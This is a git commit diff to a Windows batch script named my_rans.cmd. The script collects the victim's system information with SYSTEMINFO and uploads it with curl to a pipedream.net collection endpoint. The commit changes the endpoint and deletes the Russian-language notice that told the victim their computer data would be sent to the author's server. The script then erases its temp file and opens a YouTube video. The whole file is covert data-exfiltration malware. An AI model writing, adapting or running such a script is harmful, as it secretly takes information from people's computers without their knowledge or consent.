8c15c548c3f869de2ee59ffdeac9b0afd99fdfb7
za-sec <eremeevvanya1@gmail.com>
2022-01-02 11:03:14 +0300

    Update my_rans.cmd

--- my_rans.cmd
+++ my_rans.cmd
@@ -2,16 +2,7 @@
 
 SYSTEMINFO > tmp.txt
 
-curl.exe -F --data=@tmp.txt https://f0dea6f9d3a33c246f89ed0e770012bd.m.pipedream.net
-
+curl.exe -F --data=@tmp.txt https://d300971a5e2fdf010da7e4fe483c09fc.m.pipedream.net
 del tmp.txt
-
-echo Не боись, щас соберется инфа про твой комп и прилетит ко мне на сервер, больше ничего не будет > mes.txt
-echo.>> mes.txt
-echo Закрой файл) >> mes.txt
-
-mes.txt
-
-del /f mes.txt
 
 start https://www.youtube.com/watch?v=7JRbCWDqe1I^&t=41s
